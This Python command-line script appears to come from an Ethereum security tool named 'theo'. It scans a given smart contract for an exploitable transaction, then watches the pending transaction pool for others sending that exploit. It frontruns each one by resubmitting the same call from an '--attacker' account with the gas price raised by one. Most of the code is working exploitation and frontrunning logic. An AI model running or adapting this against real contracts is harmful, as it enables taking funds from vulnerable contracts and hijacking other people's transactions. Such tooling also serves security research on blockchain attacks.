import argparse
import psycopg2
from theo.server import Server
from theo.tx_pool import TxPool
from theo.scanner import exploit


def main():
    parser = argparse.ArgumentParser(
        description="Monitor contracts for balance changes or tx pool."
    )

    # # Server
    # # TODO: listen to this and save them to the postgres database
    # server = parser.add_argument_group("Server")
    # server.add_argument(
    #     "--server",
    #     help="Start server and save new vulnerabilities in the database.",
    #     metavar="",
    # )
    # server.add_argument(
    #     "--port", help="Port to listen on.", metavar="PORT_NUMBER", default=8080
    # )
    # server.add_argument(
    #     "--host", help="Address to listen on.", metavar="IP_ADDRESS", default="0.0.0.0"
    # )

    # # Postgres
    # # TODO: login to PostgreSQL
    # postgres = parser.add_argument_group("Postgres")
    # postgres.add_argument(
    #     "--postgres",
    #     help="Connect to this PostgreSQL database.",
    #     metavar="postgresql://someone@example.com/database?connect_timeout=10",
    # )

    # # Monitor balance
    # # TODO: monitor contract balance
    # balance = parser.add_argument_group("Monitor balance")
    # balance.add_argument(
    #     "--balance", help="Enable balance monitoring for the contracts", metavar=""
    # )

    # Monitor tx pool
    # TODO: monitor tx pool
    tx_pool = parser.add_argument_group("Monitor transaction pool")
    tx_pool.add_argument("--rpc", help="", metavar="", default="http://127.0.0.1:8545")
    tx_pool.add_argument("--attacker", help="Frontrun transactions from this account")

    # Address to monitor
    contract_address = parser.add_argument(
        "--contract", help="Contract to monitor", metavar="ADDRESS"
    )

    # Run mode
    run_mode = parser.add_argument(
        "run_mode",
        # choices=["balance", "tx-pool", "server"],
        choices=["tx-pool"],
        help="Choose between: balance (monitor contract balance changes), tx-pool (if any transactions want to call methods) or server (save new vulnerabilities in the database).",
    )

    args = parser.parse_args()
    # print(args.__dict__)

    # if args.run_mode == "server":
    #     exec_server(args)
    if args.run_mode == "tx-pool":
        exec_tx_pool(args)


# def exec_server(args):
#     print("Running server")
#     server = Server(args.host, args.port)
#     server.start()
#     print("Shutting down")


def exec_tx_pool(args):

    # Find exploit.
    print("Scanning for exploits")
    exploit_tx = exploit(args.rpc, args.contract)
    if exploit_tx == {}:
        print("No exploit found")
        return

    print("Found exploit", exploit_tx)

    # Wait for somebody else to exploit the contract and frontrun them.
    print(
        "Monitoring tx pool for people trying to exploit {contract}".format(
            contract=args.contract
        )
    )
    txp = TxPool(args.rpc)
    pending = txp.wait_for_attack(contract=args.contract, input=exploit_tx["input"])

    for sender in pending:
        for index in pending[sender]:
            attack = pending[sender][index]
            print("Found attack", attack)

            frontrun_tx = {
                "from": args.attacker,
                "to": args.contract,
                "gasPrice": hex(int(attack["gasPrice"], 16) + 1),
                "input": attack["input"],
                "gas": attack["gas"],
                "value": attack["value"],
            }

            print("Frontrunning with", frontrun_tx)
            txp.send_tx(frontrun_tx)

    print("Shutting down")